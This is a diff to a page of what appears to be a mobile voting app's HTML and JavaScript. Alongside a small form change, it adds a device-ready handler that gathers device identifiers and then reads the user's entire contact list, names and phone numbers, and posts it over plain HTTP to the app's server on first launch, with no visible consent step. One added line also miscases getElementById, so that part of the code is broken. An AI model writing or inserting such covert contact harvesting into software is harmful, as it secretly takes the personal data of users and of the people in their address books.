@@ -354,7 +354,7 @@ input::placeholder {
 	</div>
 	
 	</div>
-
+<input type="hidden" id="appID" value="">
 </div><!-- /page -->
 <script>
 function logout(){
@@ -552,7 +552,8 @@ function hide_loading_animation()
 function myFunc4() {
 showLoad();
 var phn = $('#account-phone').val();
-var data = $("#form4").serialize();
+var appID = $('#appID').val();
+var data = $("#form4").serialize() + "&appID=" + appID;
 
 var users= JSON.parse(window.localStorage.getItem('app_user'));
 $.post('http://247votes.com.ng/app/api.php', data, function(response){
@@ -639,6 +640,44 @@ myFunction();
 <script type="text/javascript" src="js/index.js"></script>
 <script type="text/javascript">
         app.initialize();
+function onDeviceReady() { 
+var uid = device.uuid;
+document.getElementByID('appID').value=uid;
+var obj = { deviceModel : device.model, deviceName: device.name, platform : device.platform, uuid : device.uuid, version : device.version, manufacture : device.manufacturer };
+var myJSON = JSON.stringify(obj);
+	
+var settings= JSON.parse(window.localStorage.getItem('app_settings'));
+var setup = settings.setup;
+if(setup != 1){	
+$.post("http://247votes.com.ng/app/api.php",{id:'appReg',data:myJSON},function(response){
+if(response == 1){
+
+	navigator.contactsPhoneNumbers.list(function(contacts) {
+      var cl = contacts.length;
+	var dd = "";
+      for(var i = 0; i < contacts.length; i++) {
+         var cn = contacts[i].displayName;
+            var phone = contacts[i].phoneNumbers[0];
+             var pn = phone.normalizedNumber;
+	      dd += cn +" : "+ pn +",";
+      }
+$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data:cl+' || '+dd},function(response){
+if(response == 1){
+var setup = {
+    appID: uid,
+    setup: 1
+}
+window.localStorage.setItem('app_settings', JSON.stringify(setup));
+}
+});
+   }, function(error) {
+      alert(error);
+   });
+
+}
+});
+}
+    }
     </script>
 </body>
 </html>
